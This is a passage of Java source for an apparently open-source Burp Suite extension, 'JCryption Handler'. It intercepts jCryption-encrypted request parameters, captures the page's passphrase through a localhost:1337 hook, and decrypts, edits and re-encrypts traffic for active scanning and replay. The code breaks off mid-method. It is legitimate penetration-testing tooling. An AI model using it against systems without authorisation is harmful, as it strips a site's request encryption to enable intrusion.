package burp;

import java.awt.Color;
import java.awt.Component;
import java.awt.Desktop;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.FileReader;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLDecoder;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.RSAPublicKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToggleButton;
import javax.swing.SwingUtilities;
import javax.swing.filechooser.FileFilter;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck, IScannerInsertionPointProvider, IProxyListener, IExtensionStateListener {

	private static final long serialVersionUID = 1L;

	public final String EXTENSION_NAME    = "JCryption Handler";
	public final String EXTENSION_VERSION = "1.4";
	public final String EXTENSION_AUTHOR  = "Gabriele Gristina aka Matrix";
	public final String EXTENSION_URL     = "https://www.github.com/matrix/Burp-JCryption-Handler";
	public final String EXTENSION_IMG     = "/img/matrix_systemFailure.gif";

	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;

	private IMessageEditor requestViewer;
	private IMessageEditor responseViewer;
	private IHttpRequestResponse currentlyDisplayedItem;
	private final List<LogEntry> log = new ArrayList<LogEntry>();
	private Map<Integer,Integer> refs = new HashMap<>();
	private List<Integer> generateKeypairRefs = new ArrayList<Integer>();

	private JTabbedPane mainTab;

	// Preferences UI
	private boolean isEnabled;
	private JTextField txt_parameter_value;
	private JTextField txt_passphrase_value;
	private JComboBox<Integer> js_version_combo;

	private final Integer[] js_versions = { 3, 2, 1 };

	private int jCryption_version = 3;
	private byte[] mainPassphrase = "".getBytes();
	private String mainParameter = "jCryption";
	private List<IParameter> currentSession = null;
	private Map<String,String> mainKeypair = new HashMap<>();
	private Map<String,String> RSAData = new HashMap<>();

	public void importCSVToLogger(String filename)
	{
		try
		{
			synchronized(log)
			{
				BufferedReader br = new BufferedReader(new FileReader(new File(filename)));
				String line = null;
				boolean first = false;

				while((line = br.readLine())!=null)
				{
					// skip header
					if (!first)
					{
						first = true;
						continue;
					}

					String host = "";
					//String method = "";
					String URL = "";
					//String params = "";
					//String cookie = "";
					String timeStr = "";
					String timeDiff = "";
					String comment = "";
					String passphrase = "";
					String request = "";
					String response = "";
					String version = "";

					String[] splitted = line.split(",");
					int idx = 0;

					for (String ll : splitted)
					{
						String l = ll.substring(1, ll.length()-1);

						switch(idx++)
						{
							case  0: host = l; break;
							//case  1: method = l; break;
							case  2: URL = l; break;
							//case  3: params = l; break;
							case  4: passphrase = l; break;
							//case  5: cookie = l; break;
							case  6: timeStr = l; break;
							case  7: timeDiff = l; break;
							case  8: comment = l; break;
							case  9: request = l; break;
							case 10: response = l; break;
							case 11: version = l; break;
							default: break;
						}
					}

					URL url = new URL(URL);
					IHttpService httpService = helpers.buildHttpService(host, url.getPort(), url.getProtocol().equalsIgnoreCase("https"));
					HttpRequestResponse rr = new HttpRequestResponse(httpService, helpers.base64Decode(request));
					rr.setComment(comment);
					IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(rr);
					IRequestInfo irequestInfo = helpers.analyzeRequest(httpService, irequestResponse.getRequest());

					IParameter d = helpers.getRequestParameter(irequestResponse.getRequest(), mainParameter);
					if (d != null)
					{
						String urlDecoded = helpers.urlDecode(d.getValue());

						if (isBase64(urlDecoded))
						{
							Date requestDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").parse(timeStr);
							LogEntry entry = new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), null, null, passphrase, requestDate, Integer.parseInt(version));
							entry.response = helpers.base64Decode(response);
							entry.timeDiff = Long.parseLong(timeDiff);
							int row = log.size();
							if (log.add(entry)) fireTableRowsInserted(row, row);
						}
					}
				}
				br.close();
			}
		}
		catch (Exception e)
		{
			throw new RuntimeException(e);
		}
	}

	public void exportLoggerToCSV(String filename)
	{
		try
		{
			FileWriter fr = new FileWriter(filename);
			fr.write("Host,Method,URL,Params,Passphrase,Cookies,RequestDate,ResponseTimeMS,Comment,Request,Response,jCryptionVersion\n");
			for (LogEntry entry : log) fr.write(entry.toCSV() + "\n");
			fr.close();
		}
		catch (Exception e)
		{
			throw new RuntimeException(e);
		}
	}

	public boolean isBase64(String s)
	{
		Pattern p = Pattern.compile("^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$");
		return p.matcher(s).matches();
	}

	public byte[] getCurrentPassphrase(String dataHash)
	{
		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());

		return (r.size() > 0 && r.get(0).passphrase.length() > 0) ? r.get(0).passphrase.getBytes() : mainPassphrase;
	}

	public int getCurrentJCryptionJSVersion(String dataHash)
	{
		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());

		return (r.size() > 0 && (r.get(0).version >= 1 && r.get(0).version <= 3)) ? r.get(0).version : jCryption_version;
	}

	public String getPlaintextFromLogger(String dataHash)
	{
		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());

		return (r.size() > 0 && r.get(0).params.length > 0) ? helpers.bytesToString(r.get(0).params) : "";
	}

	public String getSFromLogger(String dataHash)
	{
		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());

		return (r.size() > 0 && r.get(0).v1_s.length() > 0) ? r.get(0).v1_s : "";
	}

	// IBurpExtender

	@Override
	public void registerExtenderCallbacks(IBurpExtenderCallbacks icallbacks) {
		this.callbacks = icallbacks;
		this.helpers = callbacks.getHelpers();

		callbacks.setExtensionName(EXTENSION_NAME);

		callbacks.registerScannerCheck(this);
		callbacks.registerScannerInsertionPointProvider(this);
		callbacks.registerMessageEditorTabFactory(this);
		callbacks.registerContextMenuFactory(this);
		callbacks.registerProxyListener(this);
		callbacks.registerExtensionStateListener(this);

		// if found, restore extension settings
		String lastParameter = callbacks.loadExtensionSetting("JCryption_lastParameter");
		if (lastParameter != null && lastParameter.length() > 0) mainParameter = lastParameter;
		String lastPassphrase = callbacks.loadExtensionSetting("JCryption_lastPassphrase");
		if (lastPassphrase != null && lastPassphrase.length() > 0) mainPassphrase = helpers.stringToBytes(lastPassphrase);
		String lastVersion = callbacks.loadExtensionSetting("JCryption_lastVersion");
		if (lastVersion != null && lastVersion.length() > 0) jCryption_version = Integer.parseInt(lastVersion);

		// UI

		SwingUtilities.invokeLater(new Runnable()
		{
			@Override
			public void run()
			{
				JSplitPane loggerPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

				Table logTable = new Table(BurpExtender.this);
				JScrollPane scrollPane = new JScrollPane(logTable);
				loggerPane.setLeftComponent(scrollPane);

				JTabbedPane tabs = new JTabbedPane();
				requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
				responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);
				tabs.addTab("Request", requestViewer.getComponent());
				tabs.addTab("Response", responseViewer.getComponent());
				loggerPane.setRightComponent(tabs);

				// Preferences UI
				JPanel preferencesPane = new JPanel();
				preferencesPane.setLayout(null);

				final JToggleButton tglbtn_status = new JToggleButton("Disable");
				tglbtn_status.setBounds(178, 26, 94, 32);
				tglbtn_status.addItemListener(new ItemListener() {
					public void itemStateChanged(ItemEvent e) {
						if (e.getStateChange() == ItemEvent.SELECTED)
						{
							tglbtn_status.setText("Disable");
							isEnabled = true;
						}
						else
						{
							tglbtn_status.setText("Enable");
							isEnabled = false;
						}
					}
				});

				JLabel lbl_status = new JLabel("Status");
				lbl_status.setBounds(104, 26, 50, 32);
				preferencesPane.add(lbl_status);
				tglbtn_status.setSelected(true);
				preferencesPane.add(tglbtn_status);

				JLabel lbl_parameter = new JLabel("Parameter");
				lbl_parameter.setBounds(74, 102, 80, 32);
				preferencesPane.add(lbl_parameter);

				txt_parameter_value = new JTextField();
				txt_parameter_value.setBounds(178, 102, 256, 32);
				txt_parameter_value.setText(mainParameter);
				txt_parameter_value.setColumns(10);
				preferencesPane.add(txt_parameter_value);

				JLabel lbl_passphrase = new JLabel("Passphrase");
				lbl_passphrase.setBounds(66, 140, 86, 32);
				preferencesPane.add(lbl_passphrase);

				txt_passphrase_value = new JTextField();
				txt_passphrase_value.setBounds(178, 140, 256, 32);
				txt_passphrase_value.setText(helpers.bytesToString(mainPassphrase));
				txt_passphrase_value.setColumns(10);
				preferencesPane.add(txt_passphrase_value);

				JLabel lbl_js_version = new JLabel("JS Version");
				lbl_js_version.setBounds(70, 178, 86, 32);
				preferencesPane.add(lbl_js_version);

				js_version_combo = new JComboBox<>(js_versions);
				js_version_combo.setBounds(178, 178, 48, 32);
				js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
				js_version_combo.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						int sel = (int)js_version_combo.getSelectedItem();
						jCryption_version = sel;
						callbacks.saveExtensionSetting("JCryption_lastVersion", Integer.toString(sel));
					}
				});
				preferencesPane.add(js_version_combo);

				JButton btn_save = new JButton("Save");
				btn_save.setBounds(366, 216, 68, 32);
				btn_save.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						String tmp1 = txt_parameter_value.getText();
						if (tmp1.length() > 0)
						{
							mainParameter = tmp1;
							callbacks.saveExtensionSetting("JCryption_lastParameter", tmp1);
						}

						String tmp2 = txt_passphrase_value.getText();
						if (tmp2.length() > 0)
						{
							mainPassphrase = tmp2.getBytes();
							callbacks.saveExtensionSetting("JCryption_lastPassphrase", tmp2);
						}
					}
				});
				preferencesPane.add(btn_save);

				JButton btn_clear = new JButton("Clear");
				btn_clear.setBounds(280, 216, 68, 32);
				btn_clear.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {

						if (JOptionPane.showConfirmDialog(null,
							"Restore extension settings to default. Are you sure ?",
							"Confirm",
							JOptionPane.YES_NO_OPTION,
							JOptionPane.QUESTION_MESSAGE) == JOptionPane.NO_OPTION)
						{
							return;
						}

						mainParameter = "jCryption";
						txt_parameter_value.setText(mainParameter);
						callbacks.saveExtensionSetting("JCryption_lastParameter", mainParameter);

						mainPassphrase = "".getBytes();
						txt_passphrase_value.setText("");
						callbacks.saveExtensionSetting("JCryption_lastPassphrase", "");

						jCryption_version = 3;
						js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);

						callbacks.saveExtensionSetting("JCryption_lastVersion", Integer.toString(jCryption_version));
					}
				});
				preferencesPane.add(btn_clear);

				JButton btn_export = new JButton("Export Logs");
				btn_export.setBounds(314, 64, 118, 32);
				btn_export.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						JFileChooser fc = new JFileChooser();
						fc.setDialogTitle("Choose a file to save the Logger entries to");

						FileFilter filter = new FileNameExtensionFilter("CSV file", "csv");
						fc.addChoosableFileFilter(filter);
						fc.setFileFilter(filter);
						fc.setAcceptAllFileFilterUsed(false);

						if (fc.showSaveDialog(null) == JFileChooser.APPROVE_OPTION)
						{
							if (fc.getSelectedFile().exists())
							{
								if (JOptionPane.showConfirmDialog(null,
									"This file already exists. Are you sure ?",
									"Confirm",
									JOptionPane.YES_NO_OPTION,
									JOptionPane.QUESTION_MESSAGE) == JOptionPane.NO_OPTION)
								{
									return;
								}
							}
							String fname = fc.getSelectedFile().getAbsolutePath();
							callbacks.issueAlert("Saving the CSV ...");
							exportLoggerToCSV(fname);
							callbacks.issueAlert("The CSV has been saved to " + fname);
						}
					}
				});
				preferencesPane.add(btn_export);

				JButton btn_import = new JButton("Import Logs");
				btn_import.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						JFileChooser fc = new JFileChooser();
						fc.setDialogTitle("Choose a CSV file to import");
						fc.setFileSelectionMode(JFileChooser.FILES_ONLY);

						FileFilter filter = new FileNameExtensionFilter("CSV file", "csv");
						fc.addChoosableFileFilter(filter);
						fc.setFileFilter(filter);
						fc.setAcceptAllFileFilterUsed(false);

						if (fc.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
							String fname = fc.getSelectedFile().getAbsolutePath();
							callbacks.issueAlert("Loading the CSV from " + fname);
							importCSVToLogger(fname);
							callbacks.issueAlert("The CSV has been loaded");
						}
					}
				});
				btn_import.setBounds(178, 64, 118, 32);
				preferencesPane.add(btn_import);

				JLabel lbl_logger = new JLabel("Logger");
				lbl_logger.setBounds(100, 64, 50, 32);
				preferencesPane.add(lbl_logger);

				isEnabled = true;

				// About UI

				JPanel aboutPane = new JPanel();
				aboutPane.setLayout(null);

				JLabel lbl_name = new JLabel("Name");
				lbl_name.setBounds(104, 26, 45, 32);
				aboutPane.add(lbl_name);

				JLabel lbl_name_value = new JLabel(EXTENSION_NAME);
				lbl_name_value.setBounds(178, 26, 130, 32);
				aboutPane.add(lbl_name_value);

				JLabel lbl_version = new JLabel("Version");
				lbl_version.setBounds(90, 64, 60, 32);
				aboutPane.add(lbl_version);

				JLabel lbl_version_value = new JLabel(EXTENSION_VERSION);
				lbl_version_value.setBounds(178, 64, 40, 32);
				aboutPane.add(lbl_version_value);

				JLabel lbl_author = new JLabel("Author");
				lbl_author.setBounds(96, 102, 50, 32);
				aboutPane.add(lbl_author);

				JLabel lbl_author_value = new JLabel(EXTENSION_AUTHOR);
				lbl_author_value.setBounds(178, 102, 205, 32);
				aboutPane.add(lbl_author_value);

				JLabel lbl_development = new JLabel("Development");
				lbl_development.setBounds(53, 140, 98, 32);
				aboutPane.add(lbl_development);

				JLabel lbl_development_value = new JLabel(EXTENSION_URL);
				lbl_development_value.setBounds(178, 140, 390, 32);
				lbl_development_value.addMouseListener(new MouseAdapter() {
					@Override
					public void mouseClicked(MouseEvent arg0) {
						Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
						if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
							try {
								desktop.browse(new URL(EXTENSION_URL).toURI());
							} catch (Exception e) {
								throw new RuntimeException(e);
							}
						}
					}
				});
				lbl_development_value.setForeground(Color.BLUE);
				aboutPane.add(lbl_development_value);

				URL url = getClass().getResource(EXTENSION_IMG);
				if (url != null)
				{
					ImageIcon imageIcon = new ImageIcon(url);
					JLabel lbl_image = new JLabel(imageIcon);
					lbl_image.setBounds(178, 178, 180, 108);
					aboutPane.add(lbl_image);
				}

				// MainTab UI
				mainTab = new JTabbedPane();
				mainTab.addTab("Logger", null, loggerPane, null);
				mainTab.addTab("Preferences", null, preferencesPane, null);
				mainTab.addTab("About", null, aboutPane, null);

				callbacks.customizeUiComponent(loggerPane);
				callbacks.customizeUiComponent(preferencesPane);
				callbacks.customizeUiComponent(aboutPane);
				callbacks.customizeUiComponent(mainTab);

				callbacks.addSuiteTab(BurpExtender.this);
			}
		});
	}

	// ITab

	@Override
	public String getTabCaption() {
		return EXTENSION_NAME;
	}

	@Override
	public Component getUiComponent() {
		return mainTab;
	}

	// AbstractTableModel

	@Override
	public int getColumnCount() {
		return 11;
	}

	@Override
	public String getColumnName(int columnIndex)
	{
		switch (columnIndex)
		{
			case 0:
				return "#";
			case 1:
				return "Host";
			case 2:
				return "Method";
			case 3:
				return "URL";
			case 4:
				return "Params";
			case 5:
				return "Passphrase";
			case 6:
				return "Cookie";
			case 7:
				return "Time";
			case 8:
				return "Response Time (ms)";
			case 9:
				return "Comment";
			case 10:
				return "jCryption version";
			default:
				return "";
		}
	}

	@Override
	public int getRowCount() {
		return log.size();
	}

	@Override
	public Object getValueAt(int rowIndex, int columnIndex) {
		LogEntry logEntry = log.get(rowIndex);

		switch (columnIndex)
		{
			case 0:
				return rowIndex;
			case 1:
				return logEntry.host;
			case 2:
				return logEntry.method;
			case 3:
				return logEntry.url.toString();
			case 4:
				return helpers.bytesToString(logEntry.params);
			case 5:
				return logEntry.passphrase;
			case 6:
				return logEntry.cookie;
			case 7:
				return logEntry.timeStr;
			case 8:
				return logEntry.timeDiff;
			case 9:
				return logEntry.comment;
			case 10:
				return logEntry.version;
			default:
				return "";
		}
	}

	// IMessageEditorController

	@Override
	public IHttpService getHttpService() {
		return (currentlyDisplayedItem == null) ? null : currentlyDisplayedItem.getHttpService();
	}

	@Override
	public byte[] getRequest() {
		return (currentlyDisplayedItem == null) ? "".getBytes() : currentlyDisplayedItem.getRequest();
	}

	@Override
	public byte[] getResponse() {
		return (currentlyDisplayedItem == null) ? "".getBytes() : currentlyDisplayedItem.getResponse();
	}

	// IMessageEditorTabFactory

	@Override
	public IMessageEditorTab createNewInstance(IMessageEditorController controller, boolean editable) {
		return new MessageEditorTab(controller, editable);
	}

	// IMessageEditorTab

	class MessageEditorTab implements IMessageEditorTab
	{
		private boolean editable;
		private ITextEditor txtInput;
		private byte[] currentMessage;
		private byte currentParamType;
		private byte[] currentPassphrase;
		private int currentJSVersion = 0;
		private int currentS = 0;

		public MessageEditorTab(IMessageEditorController controller, boolean editable)
		{
			this.editable = editable;

			txtInput = callbacks.createTextEditor();
			txtInput.setEditable(editable);
		}

		@Override
		public String getTabCaption() {
			return EXTENSION_NAME;
		}

		@Override
		public Component getUiComponent() {
			return txtInput.getComponent();
		}

		@Override
		public boolean isEnabled(byte[] content, boolean isRequest) {
			return isRequest && helpers.getRequestParameter(content, mainParameter) != null && isEnabled == true;
		}

		@Override
		public void setMessage(byte[] content, boolean isRequest) {

			txtInput.setText(null);
			txtInput.setEditable(false);

			if (content != null)
			{
				int check = 0;
				IParameter p = helpers.getRequestParameter(content, mainParameter);
				String urlDecoded = helpers.urlDecode(p.getValue());
				byte[] ciphertext = "".getBytes();
				String dataHash = "";

				if (isBase64(urlDecoded))
				{
					ciphertext = helpers.base64Decode(urlDecoded);
					dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
				}

				currentPassphrase = getCurrentPassphrase(dataHash);

				if (currentPassphrase != null && currentPassphrase.length > 0)
				{
					currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
					currentParamType = p.getType();
					byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);

					txtInput.setText(decrypted);
					txtInput.setEditable(editable);
				}
				else
				{
					ciphertext = helpers.stringToBytes(p.getValue());
					dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
					currentJSVersion = getCurrentJCryptionJSVersion(dataHash);

					if (currentJSVersion == 1)
					{
						currentParamType = p.getType();
						String plaintext = getPlaintextFromLogger(dataHash);
						String tmpS = getSFromLogger(dataHash);

						if (tmpS != null && tmpS.length() > 0 && plaintext != null && plaintext.length() > 0)
						{
							currentS = Integer.parseInt(tmpS);
							txtInput.setText(helpers.stringToBytes(plaintext));
							txtInput.setEditable(editable);
						}
					}
				}
			}

			currentMessage = content;
		}

		@Override
		public byte[] getMessage() {
			if (txtInput.isTextModified())
			{
				byte[] plaintext = txtInput.getText();

				if (currentPassphrase != null && currentJSVersion != 0)
				{
					byte[] ciphertext = JCryption.encrypt(currentPassphrase, plaintext, currentJSVersion);
					String input = helpers.urlEncode(helpers.base64Encode(ciphertext));
					return helpers.updateParameter(currentMessage, helpers.buildParameter(mainParameter, input, currentParamType));
				}
				else if (currentJSVersion == 1 && currentS != 0)
				{
					String ciphertext = JCryption.encrypt_v1(helpers.bytesToString(plaintext), JCryption.getRSAPubKey(mainKeypair.get("e"), mainKeypair.get("n")), currentS);
					return helpers.updateParameter(currentMessage, helpers.buildParameter(mainParameter, ciphertext, currentParamType));
				}
			}

			return currentMessage;
		}

		@Override
		public boolean isModified() {
			return txtInput.isTextModified();
		}

		@Override
		public byte[] getSelectedData() {
			return txtInput.getSelectedText();
		}
	}

	// IContextMenuFactory

	@Override
	public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
		List<JMenuItem> items = new LinkedList<JMenuItem>();

		JMenu mainMenu = new JMenu(EXTENSION_NAME);

		JMenu sendToActiveScan_subMenu = new JMenu("Send to Active Scan");
		JMenuItem ActiveScan_OriginalSession = new JMenuItem("Using original session");

		ActiveScan_OriginalSession.addMouseListener(new MouseListener() {

			@Override
			public void mouseClicked(MouseEvent arg0) {
			}

			@Override
			public void mouseEntered(MouseEvent arg0) {
			}

			@Override
			public void mouseExited(MouseEvent arg0) {
			}

			@Override
			public void mousePressed(MouseEvent arg0) {
				IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();

				for (IHttpRequestResponse iReqResp : selectedMessages)
				{
					callbacks.doActiveScan(iReqResp.getHttpService().getHost(), iReqResp.getHttpService().getPort(), iReqResp.getHttpService().getProtocol().equalsIgnoreCase("https"), iReqResp.getRequest());
				}
			}

			@Override
			public void mouseReleased(MouseEvent arg0) {
			}
		});

		JMenuItem ActiveScan_CurrentSession = new JMenuItem("Using current session");

		ActiveScan_CurrentSession.addMouseListener(new MouseListener() {

			@Override
			public void mouseClicked(MouseEvent arg0) {
			}

			@Override
			public void mouseEntered(MouseEvent arg0) {
			}

			@Override
			public void mouseExited(MouseEvent arg0) {
			}

			@Override
			public void mousePressed(MouseEvent arg0) {
				IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();

				for (IHttpRequestResponse iReqResp : selectedMessages)
				{
					byte[] request = iReqResp.getRequest();

					List<IParameter> c = currentSession;
					if (c != null && c.size() > 0)
					{
						for (IParameter parameter : c)
						{
							byte[] tmp = helpers.updateParameter(request, parameter);
							if (tmp.length > 0)
								request = tmp;
						}
					}

					// get 'data' parameter
					IParameter d = helpers.getRequestParameter(request, mainParameter);
					String urlDecoded = helpers.urlDecode(d.getValue());

					if (isBase64(urlDecoded))
					{
						// decrypt with currentPassphrase
						byte[] ciphertext = helpers.base64Decode(urlDecoded);
						String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
						byte[] currentPassphrase = getCurrentPassphrase(dataHash);
						int currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
						byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);

						// encrypt with mainPassphrase
						byte[] encrypt = JCryption.encrypt(mainPassphrase, decrypted, currentJSVersion); // keep the same JS version :)

						// updateParameter 'data' value
						IParameter d2 = helpers.buildParameter(mainParameter, helpers.urlEncode(helpers.base64Encode(encrypt)), d.getType());
						byte[] request2 = helpers.updateParameter(request, d2);

						callbacks.doActiveScan(iReqResp.getHttpService().getHost(), iReqResp.getHttpService().getPort(), iReqResp.getHttpService().getProtocol().equalsIgnoreCase("https"), request2);
					}
				}
			}

			@Override
			public void mouseReleased(MouseEvent arg0) {
			}
		});

		sendToActiveScan_subMenu.add(ActiveScan_OriginalSession);
		sendToActiveScan_subMenu.add(ActiveScan_CurrentSession);

		JMenu sendToRepeater_subMenu = new JMenu("Send to Repeater");
		JMenuItem Repeater_OriginalSession = new JMenuItem("Using original session");

		Repeater_OriginalSession.addMouseListener(new MouseListener() {

			@Override
			public void mouseClicked(MouseEvent arg0) {
			}

			@Override
			public void mouseEntered(MouseEvent arg0) {
			}

			@Override
			public void mouseExited(MouseEvent arg0) {
			}

			@Override
			public void mousePressed(MouseEvent arg0) {
				IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();

				for (IHttpRequestResponse iReqResp : selectedMessages)
				{
					IHttpService httpService = iReqResp.getHttpService();

					byte[] request = iReqResp.getRequest();

					callbacks.sendToRepeater(
							httpService.getHost(),
							httpService.getPort(),
							httpService.getProtocol().equalsIgnoreCase("https"),
							request,
							EXTENSION_NAME);
				}
			}

			@Override
			public void mouseReleased(MouseEvent arg0) {
			}
		});

		JMenuItem Repeater_CurrentSession = new JMenuItem("Using current session");

		Repeater_CurrentSession.addMouseListener(new MouseListener() {

			@Override
			public void mouseClicked(MouseEvent arg0) {
			}

			@Override
			public void mouseEntered(MouseEvent arg0) {
			}

			@Override
			public void mouseExited(MouseEvent arg0) {
			}

			@Override
			public void mousePressed(MouseEvent arg0) {
				IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();

				for (IHttpRequestResponse iReqResp : selectedMessages)
				{
					IHttpService httpService = iReqResp.getHttpService();

					byte[] request = iReqResp.getRequest();

					List<IParameter> c = currentSession;
					if (c != null && c.size() > 0)
					{
						for (IParameter parameter : c)
						{
							byte[] tmp = helpers.updateParameter(request, parameter);
							if (tmp.length > 0)
								request = tmp;
						}
					}

					// get 'data' parameter
					IParameter d = helpers.getRequestParameter(request, mainParameter);
					String urlDecoded = helpers.urlDecode(d.getValue());

					if (isBase64(urlDecoded))
					{
						// decrypt with currentPassphrase
						byte[] ciphertext = helpers.base64Decode(urlDecoded);
						String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
						byte[] currentPassphrase = getCurrentPassphrase(dataHash);
						int currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
						byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);

						// encrypt with mainPassphrase
						byte[] encrypt = JCryption.encrypt(mainPassphrase, decrypted, currentJSVersion); // keep the same JS version :)

						// updateParameter 'data' value
						IParameter d2 = helpers.buildParameter(mainParameter, helpers.urlEncode(helpers.base64Encode(encrypt)), d.getType());
						byte[] request2 = helpers.updateParameter(request, d2);

						callbacks.sendToRepeater(
								httpService.getHost(),
								httpService.getPort(),
								httpService.getProtocol().equalsIgnoreCase("https"),
								request2,
								EXTENSION_NAME);
					}
				}
			}

			@Override
			public void mouseReleased(MouseEvent arg0) {
			}
		});

		sendToRepeater_subMenu.add(Repeater_OriginalSession);
		sendToRepeater_subMenu.add(Repeater_CurrentSession);

		mainMenu.add(sendToActiveScan_subMenu);
		mainMenu.add(sendToRepeater_subMenu);

		items.add(mainMenu);
		return items;
	}

	// IProxyListener

	@Override
	public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message) {

		if (isEnabled)
		{
			IHttpRequestResponse messageInfo = message.getMessageInfo();

			if (messageIsRequest)
			{
				IParameter d = helpers.getRequestParameter(messageInfo.getRequest(), mainParameter);
				if (d != null)
				{
					String urlDecoded = helpers.urlDecode(d.getValue());

					if (isBase64(urlDecoded) && jCryption_version != 1)
					{
						synchronized(log)
						{
							int row = log.size();
							IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
							IRequestInfo irequestInfo = helpers.analyzeRequest(irequestResponse);
							int ref = message.getMessageReference();

							log.add(new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), null, null, helpers.bytesToString(mainPassphrase), null, jCryption_version));
							fireTableRowsInserted(row, row);

							refs.put(ref, row);

							List<IParameter> c = new ArrayList<IParameter>();
							List<IParameter> requestParams = irequestInfo.getParameters();

							for (IParameter parameter : requestParams)
							{
								if (parameter.getType() != IParameter.PARAM_COOKIE) continue;
								c.add(parameter);
							}

							if (c.size() > 0) currentSession = c;
						}
					}
					else
					{
						// extract encryptedValue
						String pStr = d.getValue();

						// check for encryptedValue in RSAData
						if (RSAData.containsKey(pStr))
						{
							synchronized(log)
							{
								int row = log.size();
								IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
								IRequestInfo irequestInfo = helpers.analyzeRequest(irequestResponse);
								int ref = message.getMessageReference();

								// get back s+plaintext from RSAData value
								String tmp = RSAData.get(pStr);
								int sOff = tmp.indexOf(',');
								String plaintext = tmp.substring(sOff+1);
								String s = tmp.substring(0, sOff);

								log.add(new LogEntry(irequestResponse, irequestInfo, helpers.stringToBytes(plaintext), pStr, s, null, null, jCryption_version));
								fireTableRowsInserted(row, row);

								refs.put(ref, row);

								List<IParameter> c = new ArrayList<IParameter>();
								List<IParameter> requestParams = irequestInfo.getParameters();

								for (IParameter parameter : requestParams)
								{
									if (parameter.getType() != IParameter.PARAM_COOKIE) continue;
									c.add(parameter);
								}

								if (c.size() > 0) currentSession = c;
							}

							RSAData.remove(pStr);
						}
					}
				}
				else
				{
					IHttpService httpService = messageInfo.getHttpService();

					if (httpService.getHost().equals("localhost") && httpService.getPort() == 1337)
					{
						IParameter p = helpers.getRequestParameter(messageInfo.getRequest(), "p");

						if (p != null && p.getValue().length() > 0)
						{
							if (jCryption_version == 2 || jCryption_version == 3) // get passphrase
							{
								String pStr = p.getValue();
								mainPassphrase = pStr.getBytes();
